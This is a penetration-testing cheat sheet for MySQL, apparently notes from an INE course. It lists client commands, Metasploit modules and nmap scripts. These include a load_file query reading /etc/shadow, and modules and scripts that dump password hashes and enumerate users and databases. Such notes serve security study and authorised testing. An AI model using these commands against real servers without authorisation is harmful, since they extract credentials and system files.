# SQL

## mysql
```
mysql -h [IP-ADDRESS] -u [USERNAME]
```
```
show databases;
```
```
use [DATABASE];
```
```
show [TABLES];
```
```
select count(*) from [TABLE];
```
```
select * from [TABLE];
```
```
select load_file("/etc/shadow");
```
```
help
```

## Metasploit
```
use auxiliary/scanner/mysql/mysql_writable_dirs
```
```
use auxiliary/scanner/mysql/mysql_hashdump
```
show advanced options:
```
advanced
```

## nmap
* --script=mysql-empty-password
* --script=mysql-info
* --script=mysql-users --script-args="mysqluser='[USERNAME]',mysqlpass='[PASSWORD]'"
* --script=mysql-databases --script-args="mysqluser='[USERNAME]',mysqlpass='[PASSWORD]'"
* --script=mysql-variables --script-args="mysqluser='[USERNAME]',mysqlpass='[PASSWORD]'"
* --script=mysql-dump-hashes --script-args="mysqluser='[USERNAME]',mysqlpass='[PASSWORD]'"
* --script=mysql-query --script-args="query='select * from [TABLE];',username='[USERNAME]',password='[PASSWORD]'"
* --script=mysql-audit --script-args="mysql-audit.username='[USERNAME]',mysql-audit.password='[PASSWORD]',mysql-audit.filename='/usr/share/nmap/nselib/data/mysql-cis.audit'"

### References

Penetration Tester Student v2 by INE  
https://my.ine.com/CyberSecurity/learning-paths/61f88d91-79ff-4d8f-af68-873883dbbd8c/penetration-testing-student-v2
